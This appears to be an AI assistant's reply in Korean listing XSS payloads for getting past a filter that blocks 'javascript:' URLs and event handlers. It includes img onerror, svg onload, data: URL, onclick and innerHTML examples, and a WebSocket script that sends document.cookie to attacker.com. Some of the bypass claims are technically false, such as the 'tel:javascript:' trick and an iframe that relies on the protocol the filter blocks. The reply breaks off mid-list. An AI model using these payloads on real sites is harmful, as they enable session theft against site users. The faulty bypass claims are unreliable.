알겠습니다! \*\*`javascript:`\*\*와 **이벤트 핸들러**가 \*\*`void`\*\*로 자동 변환되고 필터링되는 상황에서 **추가적으로 취약한 공격 구문**을 진단하려면, **자바스크립트**를 직접 실행할 수 있는 다른 우회 방법을 찾아야 합니다. 이미 **`javascript:`** 프로토콜이 차단된 상태라면, 공격자는 **HTML 요소**, **이벤트 핸들러**, 또는 **웹 기술**을 우회할 수 있는 방법을 찾아야 합니다.

여기서는 **필터링 우회**와 **스크립트 실행**을 방지하기 위해 활용할 수 있는 **대체 공격 기법들**을 다루겠습니다.

### 1. **DOM 요소에 대한 공격 (이미지, SVG, IFRAME 등)**

브라우저에서 \*\*`javascript:`\*\*를 필터링하는 경우에도, **HTML 요소**에 내장된 **이벤트 핸들러**나 **태그 속성**을 통해 **자바스크립트 실행**을 유도할 수 있습니다.

#### 예시 공격 코드:

* **`<img>` 태그의 `onerror` 이벤트 활용**: 이미지를 불러오지 못할 경우 **`onerror`** 이벤트를 통해 자바스크립트를 실행할 수 있습니다.

```html
<img src="invalid-image" onerror="alert('XSS - img onerror')">
```

* **`<svg>` 태그 활용**: **SVG** 내에서도 \*\*`onload`\*\*나 **`onerror`** 등의 이벤트를 사용해 XSS를 유발할 수 있습니다.

```html
<svg onload="alert('XSS - SVG')">
    <rect width="100" height="100" style="fill:blue"/>
</svg>
```

* **`<iframe>` 태그 활용**: \*\*`iframe`\*\*을 사용하여 **스크립트 실행**을 유도할 수 있습니다.

```html
<iframe src="javascript:alert('XSS - iframe')"></iframe>
```

### 2. **`data:` URL을 통한 공격**

브라우저가 **자바스크립트**를 처리하지 않도록 필터링하는 상황에서도, **`data:`** URL을 이용해 **이미지**나 **스크립트**를 **inline으로 삽입**할 수 있습니다.

#### 예시 공격 코드:

* **`data:` URL을 통해 악성 스크립트 삽입**:

```html
<img src="data:image/svg+xml,<svg onload=alert('XSS')></svg>">
```

이 코드에서는 **`data:`** URL을 사용하여 **SVG 이미지** 내에서 **`onload`** 이벤트를 트리거하여 자바스크립트가 실행됩니다.

### 3. **특수 프로토콜 사용**

**`javascript:`** 외에도, 다른 프로토콜을 활용한 **우회**가 가능합니다. 예를 들어, **`tel:`**, **`file:`**, \*\*`data:`\*\*와 같은 **다른 프로토콜**을 사용하여 **자바스크립트**를 실행하거나 **악성 행위**를 유도할 수 있습니다.

#### 예시 공격 코드:

* **`tel:` 프로토콜을 통한 XSS 우회**:

  * 일부 브라우저에서는 **`tel:`** 프로토콜을 사용할 수 있습니다. 이를 통해 **자바스크립트 코드**가 실행되도록 할 수 있습니다.

  ```html
  <a href="tel:javascript:alert('XSS')">Click me</a>
  ```

* **`data:` 프로토콜을 통한 스크립트 실행**:

  * **`data:`** 프로토콜을 사용하여 \*\*`alert()`\*\*이나 **스크립트**를 실행할 수 있습니다.

  ```html
  <a href="data:text/html,<script>alert('XSS')</script>">Click me</a>
  ```

### 4. **폼 필드를 통한 악성 스크립트 삽입**

**폼 필드**나 **입력 필드**에 악성 코드를 삽입하는 방법도 있습니다. 사용자가 입력한 값이 **DOM**에 삽입되면 **XSS** 공격이 발생할 수 있습니다.

#### 예시 공격 코드:

* **`<form>` 입력 필드 활용**:

  * 사용자가 입력한 값에 **악성 스크립트**를 삽입하고, 서버에서 이를 **DOM에 반영**할 때 **XSS**를 유발할 수 있습니다.

  ```html
  <form action="search">
      <input type="text" name="q" value="<script>alert('XSS')</script>">
      <button type="submit">Search</button>
  </form>
  ```

### 5. **DOM 삽입 공격 (innerHTML, eval 등)**

`innerHTML`이나 \*\*`eval`\*\*과 같은 JavaScript 메서드를 사용할 때, 악성 코드가 **DOM에 삽입**될 수 있습니다. 이러한 방법은 **자바스크립트 코드**를 실행시키는 방식으로 **XSS**를 유발할 수 있습니다.

#### 예시 공격 코드:

* **`innerHTML`을 통한 DOM 조작**:

  * 악성 스크립트를 \*\*`innerHTML`\*\*을 통해 **DOM에 삽입**할 수 있습니다.

  ```html
  <div id="target"></div>
  <script>
      document.getElementById('target').innerHTML = '<img src="invalid" onerror="alert(\'XSS\')">';
  </script>
  ```

### 6. **DOM 이벤트 우회 (예: `onclick` 등)**

**`javascript:`** 구문이 필터링되어도 \*\*`onclick`\*\*과 같은 **이벤트 핸들러**를 사용하여 자바스크립트를 실행할 수 있습니다. 특히 **`<a>`**, **`<button>`** 등의 **HTML 요소**에 **이벤트 핸들러**를 추가하여 스크립트를 실행할 수 있습니다.

#### 예시 공격 코드:

* **`onclick` 이벤트 핸들러 사용**:

  * **`<a>`** 태그나 **`<button>`** 등에 **`onclick`** 이벤트를 삽입하여 스크립트를 실행할 수 있습니다.

  ```html
  <a onclick="alert('XSS')">Click me</a>
  ```

  * **`<button>` 사용**:

  ```html
  <button onclick="alert('XSS')">Click me</button>
  ```

### 7. **WebSocket을 이용한 정보 유출**

WebSocket을 활용하여 **클라이언트-서버** 간의 실시간 통신을 **악용**할 수 있습니다. WebSocket은 **XSS 우회** 기법으로 사용할 수 있습니다.

#### 예시 공격 코드:

* **WebSocket을 통한 정보 유출**:

  * 악성 코드를 삽입하여 **WebSocket**을 통해 **민감한 정보**를 외부 서버로 유출할 수 있습니다.

  ```html
  <script>
      var ws = new WebSocket('ws://attacker.com/socket');
      ws.onopen = function() { ws.send(document.cookie); };
  </script>
  ```

---

### 결론

**`javascript:`** 프로토콜이 \*\*`void(0)`\*\*로 변환되고 필터링된 상황에서도 여전히 **XSS**와 같은 공격을 우회할 수 있는 방법은 많습니다. 다음과 같은 방법들이 **취약점을 찾을 수 있는 지점**입니다:

* **HTML 태그 이벤트 핸들러** (예: `onerror`, `onload` 등)
* **`data:` URL**을 사용하여 **악성 스크립트** 실행
* **특수 프로토콜** (예: `tel:`, `data:` 등)을 이용한 우회
* **폼 필드**나 **`innerHTML`** 등을 이용한 **DOM 삽입 공격**
* \*\*WebSocket
